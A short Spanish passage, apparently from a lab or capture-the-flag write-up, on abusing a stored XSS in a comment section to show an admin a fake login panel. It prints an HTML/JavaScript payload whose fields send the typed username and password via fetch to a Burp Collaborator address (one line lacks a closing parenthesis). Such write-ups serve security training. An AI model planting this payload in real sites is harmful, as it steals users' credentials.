
Ahora debemos de engañar al usuario admin, que inicie sesion en un panel de administrador falso, a traves del XSS stored de la seccion de comentarios

```javascript
Introduce tus credenciales de acceso: <br><br>

Usuario: <input name=username id=username onchange="fetch('https://burp-collaborator?username' + this.value)"><br>
Password: <input name=password id=password onchange="fetch('https://burp-collaborator?password' + this.value>
```

Y nos llegarán 2 peticiones  con su usuario y su contraseña


